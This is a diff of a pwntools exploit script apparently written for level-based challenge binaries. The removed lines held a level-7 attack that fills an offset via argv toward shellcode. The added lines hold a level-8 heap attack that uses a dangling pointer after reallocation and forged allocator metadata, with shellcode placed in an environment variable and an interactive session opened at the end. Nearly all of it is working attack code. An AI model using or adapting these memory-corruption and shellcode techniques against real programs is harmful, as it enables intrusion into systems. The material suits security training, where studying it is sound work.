@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template 7AAAAAAA
+# $ pwn template ./8AAAAAAA
 from pwn import *
-import math
 
 # Set up pwntools for the correct architecture
-# exe = context.binary = ELF(args.EXE or './7AAAAAAA')
-exe = context.binary = ELF(args.EXE or '/var/challenge/level7/7')
-
+exe = context.binary = ELF(args.EXE or './8AAAAAAA')
+# exe = context.binary = ELF(args.EXE or '/var/challenge/level8/8')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -33,38 +31,13 @@ env = {
 shellcode_addr = (0x7fffffffeec8 + 50)
 shellcode_addr_packed = p64(shellcode_addr)
 
-# this is the offset we need to fill to overwrite r14
-start = 0x8000000abcde
-offset = start - shellcode_addr
-
-print(f"Offset: {offset}")
-
-# try to fill the offset with the largest ascii printable character (z) which is 0x7a / 122
-# we start with the biggest char that we can print (z)
-
-argv1 = b''
-remainder = offset - 53 # 53 (char '5') is the last value that should end up in r13
-while remainder > 0:
-    if remainder > ord('z'):
-        needed = math.floor(remainder / ord('z'))
-        argv1 += b'z' * needed
-        remainder = remainder % ord('z')
-    else:
-        argv1 += chr(remainder).encode()
-        break
-    
-argv1 += b'5'
-
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
-    
-    argv = [argv1]
-    
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
     else:
-        env['L33T'] = shellcode
+        env["L33T"] = shellcode
         return process([exe.path] + argv, *a, **kw, env=env)
 
 # Specify your GDB script here for debugging
@@ -79,19 +52,37 @@ continue
 #                    EXPLOIT GOES HERE
 #===========================================================
 # Arch:     amd64-64-little
-# RELRO:      Full RELRO
-# Stack:      Canary found
+# RELRO:      Partial RELRO
+# Stack:      No canary found
 # NX:         NX unknown - GNU_STACK missing
-# PIE:        PIE enabled
+# PIE:        No PIE (0x400000)
 # Stack:      Executable
 # RWX:        Has RWX segments
-# FORTIFY:    Enabled
 # SHSTK:      Enabled
 # IBT:        Enabled
 # Stripped:   No
 # Debuginfo:  Yes
 
 io = start()
+
+# allocate small buffer
+io.sendline(b"s a=" + 60 * b"A")
+io.sendline(b"s b=" + 60 * b"B")
+
+# reallocate them with a larger value (causes a free with dangling pointer in the pairs array)
+io.sendline(b"s a=" + 145 * b"D")
+# 62 filler bytes, then the alloc metadata (32 bytes), then the new key data (value not important)
+struct_size = 8 * b"\0"
+free_prev_ptr = 8 * b"\1"
+free_next_ptr = 8 * b"\2"
+block_prev_ptr = 8 * b"\3"
+struct_metadata = struct_size + free_prev_ptr + free_next_ptr + block_prev_ptr
+io.sendline(b"s b=" + 62 * b"E" + struct_metadata + b"newkey=mysexytestest" + 31 * b"X")
+# now you can "g newkey" and it wilkl work, even tho it was not added with "s" 
+
+
+
+
 
 # shellcode = asm(shellcraft.sh())
 # payload = fit({
@@ -104,3 +95,8 @@ io = start()
 
 io.interactive()
 
+
+
+# entry at 0x7f641604b060
+# 0x7f196790a060
+0x7f3a4ba86060
